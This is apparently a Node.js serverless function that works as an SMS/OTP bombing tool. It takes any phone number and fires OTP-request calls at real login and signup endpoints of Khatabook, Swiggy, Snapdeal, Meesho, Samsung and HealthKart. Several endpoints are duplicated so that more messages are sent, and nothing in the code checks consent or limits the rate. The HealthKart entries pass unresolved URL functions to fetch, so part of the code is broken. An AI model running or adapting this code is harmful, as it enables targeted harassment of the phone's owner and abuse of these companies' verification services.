const fetch = require("node-fetch");

// Simple helper to define an API easily
const makeApi = ({ name, url, method, headers, getBody }) => ({
  name,
  url,
  method,
  headers,
  body: (phone) => getBody(phone),
});

exports.handler = async (event) => {
  const method = event.httpMethod;
  let phone;

  if (method === "GET") {
    phone = event.queryStringParameters.phone;
  } else if (method === "POST") {
    phone = JSON.parse(event.body || "{}").phone;
  }

  if (!phone) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Missing phone number" }),
    };
  }

  // ✅ Define all APIs here
  const apis = [
  // Khatabook
  makeApi({
    name: "khatabook",
    url: "https://api.khatabook.com/v1/auth/request-otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        app_signature: "Jc/Zu7qNqQ2",
        country_code: "+91",
        phone: phone,
      }),
  }),
makeApi({
  name: "swiggy",
  url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
  method: "POST",
  headers: { "Content-Type": "application/json" },
  getBody: (phone) =>
    JSON.stringify({
      mobile: phone,
    }),
}),
  // Snapdeal
  makeApi({
    name: "snapdeal",
    url: "https://m.snapdeal.com/sendOTP",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        mobileNumber: phone,
        purpose: "LOGIN_WITH_MOBILE_OTP",
      }),
  }),

  // Swiggy
  makeApi({
    name: "swiggy",
    url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        mobile: phone,
      }),
  }),
  
  makeApi({
    name: "meesho_1",
    url: "https://www.meesho.com/api/v1/user/login/request-otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        phone_number: phone,
      }),
  }),
  makeApi({
    name: "meesho_2",
    url: "https://www.meesho.com/api/v1/user/login/request-otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        phone_number: phone,
      }),
  }),
  makeApi({
    name: "meesho_3",
    url: "https://www.meesho.com/api/v1/user/login/request-otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        phone_number: phone,
      }),
  }),
makeApi({
    name: "meesho_4",
    url: "https://www.meesho.com/api/v1/user/login/request-otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        phone_number: phone,
      }),
  }),
  makeApi({
    name: "meesho_5",
    url: "https://www.meesho.com/api/v1/user/login/request-otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    getBody: (phone) =>
      JSON.stringify({
        phone_number: phone,
      }),
  }),
  
  makeApi({
  name: "samsung",
  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
  method: "POST",
  headers: { "Content-Type": "application/json" },
  getBody: (phone) =>
    JSON.stringify({
      user_id: phone,
    }),
}),

makeApi({
  name: "samsung_1",
  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
  method: "POST",
  headers: { "Content-Type": "application/json" },
  getBody: (phone) =>
    JSON.stringify({
      user_id: phone,
    }),
}),

makeApi({
  name: "samsung_2",
  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
  method: "POST",
  headers: { "Content-Type": "application/json" },
  getBody: (phone) =>
    JSON.stringify({
      user_id: phone,
    }),
}),

makeApi({
  name: "samsung_3",
  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
  method: "POST",
  headers: { "Content-Type": "application/json" },
  getBody: (phone) =>
    JSON.stringify({
      user_id: phone,
    }),
}),

makeApi({
  name: "samsung_4",
  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
  method: "POST",
  headers: { "Content-Type": "application/json" },
  getBody: (phone) =>
    JSON.stringify({
      user_id: phone,
    }),
}),
makeApi({
  name: "samsung_5",
  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
  method: "POST",
  headers: { "Content-Type": "application/json" },
  getBody: (phone) =>
    JSON.stringify({
      user_id: phone,
    }),
}),
  // HealthKart Signup (GET)
  makeApi({
    name: "healthkart_signup",
    url: (phone) =>
      `https://www.healthkart.com/veronica/user/validate/1/${phone}/signup?plt=2&st=1`,
    method: "GET",
    headers: {},
    getBody: () => null,
  }),

  // HealthKart Login (GET)
  makeApi({
    name: "healthkart_login",
    url: (phone) =>
      `https://www.healthkart.com/veronica/user/login/send/otp/1/${phone}?trkSrc=MYA-LPOPUP&forgotPassword=false&plt=2&st=1`,
    method: "GET",
    headers: {},
    getBody: () => null,
  }),
];

  let results = [];

  for (const api of apis) {
    try {
      const res = await fetch(api.url, {
        method: api.method,
        headers: api.headers,
        body: api.body(phone),
      });
      results.push({ [api.name]: res.status });
    } catch (err) {
      results.push({ [api.name]: "error" });
    }
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ phone, results }),
  };
};

  
